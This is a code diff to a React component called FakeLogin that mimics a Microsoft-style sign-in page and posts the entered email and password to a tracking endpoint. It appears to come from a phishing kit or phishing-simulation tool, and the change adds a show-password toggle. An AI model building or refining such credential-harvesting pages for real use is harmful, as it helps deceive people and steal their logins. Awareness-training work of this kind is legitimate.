@@ -8,6 +8,7 @@ export default function FakeLogin() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [step, setStep] = useState("email");
+  const [showPassword, setShowPassword] = useState(false);
 
   const submit = async () => {
     await API.post("/api/track/submit", {
@@ -64,16 +65,37 @@ export default function FakeLogin() {
               <span>{email}</span>
             </div>
             <h2 className="page-title">Enter password</h2>
-            <input
-              className="ms-input"
-              type="password"
-              placeholder="Password"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              onKeyDown={(e) => {
-                if (e.key === "Enter" && password) submit();
-              }}
-            />
+            <div style={{ position: "relative" }}>
+              <input
+                className="ms-input"
+                type={showPassword ? "text" : "password"}
+                placeholder="Password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                onKeyDown={(e) => {
+                  if (e.key === "Enter" && password) submit();
+                }}
+                style={{ paddingRight: "40px" }}
+              />
+              <button
+                type="button"
+                onClick={() => setShowPassword(!showPassword)}
+                style={{
+                  position: "absolute",
+                  right: "6px",
+                  top: "50%",
+                  transform: "translateY(-50%)",
+                  background: "none",
+                  border: "none",
+                  cursor: "pointer",
+                  fontSize: "1.1rem",
+                  color: "#6b7280",
+                  padding: "4px"
+                }}
+              >
+                {showPassword ? "👁️" : "👁️‍🗨️"}
+              </button>
+            </div>
             <div style={{ marginBottom: "20px" }}>
               <a href="#" style={{ color: "#0067b8", fontSize: "13px" }}>Forgot password?</a>
             </div>
